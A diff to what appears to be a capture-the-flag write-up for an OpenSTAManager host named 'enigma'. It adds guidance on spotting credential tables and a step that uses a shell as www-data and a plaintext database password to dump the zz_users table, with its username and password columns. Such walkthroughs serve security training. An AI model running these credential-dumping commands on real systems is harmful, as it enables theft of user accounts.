@@ -1521,7 +1521,17 @@ zz_widgets
 zz_widgets_lang
 ```
 
-```
+From the full table list, you'd scan for anything that looks user or credential related — names like `users`, `accounts`, `admin`, `members`, `auth` etc. In OpenSTAManager's case that turns out to be `zz_users`.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### Step 4 — Dump the target table:
+
+```shell
 www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null
 <penstamanager; select * from zz_users;" 2>/dev/null
 id      username        password        email   idanagrafica    idgruppo        enabled created_at      updated_at      reset_token        image_file_id   options
